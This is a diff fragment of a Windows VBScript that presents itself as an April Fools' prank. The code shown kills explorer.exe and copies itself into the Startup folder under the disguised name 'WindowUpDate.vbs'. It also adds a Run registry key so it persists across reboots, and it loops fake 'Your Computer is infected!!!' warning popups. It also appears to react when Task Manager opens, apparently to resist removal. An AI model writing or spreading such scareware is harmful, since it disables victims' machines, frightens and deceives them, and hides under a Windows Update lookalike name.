@@ -218,18 +218,18 @@ objDoc.body.style.margin = "0"\r
 objDoc.body.style.height = "100vh"\r
 objDoc.body.style.width = "100vw"\r
 objDoc.body.style.overflow = "hidden"\r
-objDoc.body.innerHTML = "<div style='color:white; font-size:20px; text-align:center; position:absolute; top:50%; left:50%; transform:translate(-50%, -50%);'>Your computer is infected!!!</div>"\r
+objDoc.body.innerHTML = "<div style='color:white; font-size:20px; text-align:center; position:absolute; top:50%; left:50%; transform:translate(-50%, -50%);'>愚人节快乐!:)</div>"\r
 \r
 Set objShell = CreateObject("WScript.Shell")\r
 objShell.Run "taskkill /F /IM explorer.exe", 0, True\r
 \r
 Set objFSO = CreateObject("Scripting.FileSystemObject")\r
-startupPath = objShell.SpecialFolders("Startup") & "\\WindowUppDate.vbs"\r
+startupPath = objShell.SpecialFolders("Startup") & "\\WindowUpDate.vbs"\r
 If Not objFSO.FileExists(startupPath) Then\r
     objFSO.CopyFile WScript.ScriptFullName, startupPath\r
 End If\r
 \r
-regKey = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowUppDate"\r
+regKey = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowUpDate"\r
 scriptPath = WScript.ScriptFullName\r
 On Error Resume Next\r
 objShell.RegRead(regKey)\r
@@ -239,7 +239,7 @@ End If\r
 On Error GoTo 0\r
 \r
 Do\r
-    objShell.Popup "愚人节快乐!:)", 0.5, "Warning", 48\r
+    objShell.Popup "Your Computer is infected!!!", 0.5, "Warning", 48\r
     WScript.Sleep 500\r
 \r
     If objShell.AppActivate("Task Manager") Then\r
